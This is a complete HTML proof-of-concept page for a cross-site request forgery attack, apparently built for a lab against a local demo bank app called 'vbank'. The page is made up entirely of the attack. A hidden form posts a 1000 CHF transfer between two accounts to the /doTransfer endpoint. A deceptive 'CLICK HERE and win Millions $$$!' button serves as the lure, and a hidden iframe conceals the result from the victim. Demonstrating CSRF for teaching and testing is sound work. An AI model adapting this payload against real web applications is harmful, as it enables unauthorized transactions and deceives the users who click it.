<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
    <h2 class="hello-title">Hello Bob!</h2>
    <form action="http://vbank.127.0.0.1.xip.io:8080/doTransfer" method="post" target="hiddenFrame" id="csrfTransferForm">
        <input name="fromAccountNo" type="hidden" value="1-123456-11">
        <input name="toAccountNo" type="hidden" value="3-123456-33">
        <input name="amount" type="hidden" value="1000">
        <input name="currency" type="hidden" value="CHF">
        <input name="note" type="hidden" value="You have been CSRF-d!">
        <input type="submit" value="CLICK HERE and win Millions $$$!" />
    </form>
    <iframe name="hiddenFrame" style="display: none;"></iframe>
</body>
</html>